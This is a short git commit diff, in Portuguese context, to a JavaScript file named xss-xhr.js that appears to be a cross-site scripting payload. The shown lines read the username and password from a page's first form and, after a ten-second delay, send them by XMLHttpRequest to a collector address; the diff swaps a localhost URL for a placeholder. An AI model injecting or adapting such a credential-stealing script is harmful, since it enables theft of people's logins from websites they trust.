b8816438113433860a758c72d240a3e9c03cdc50
Tácito Augusto Farias Júnior <81604617+tacitoau@users.noreply.github.com>
2021-09-12 09:22:25 -0300

    Initial commit

--- xss-xhr.js
+++ xss-xhr.js
@@ -4,7 +4,7 @@ password = document.forms[0].elements[1].value;
 window.setTimeout(function(){  
   
 var req = new XMLHttpRequest(); 
-req.open('GET', 'http://localhost:8080/?username=' + username + '&password=' + password + 'GETIT?', true); 
+req.open('GET', 'Adicionar localhost com porta 8080' + username + '&password=' + password + 'GETIT?', true); 
 req.send();
 
 } , 10000); 
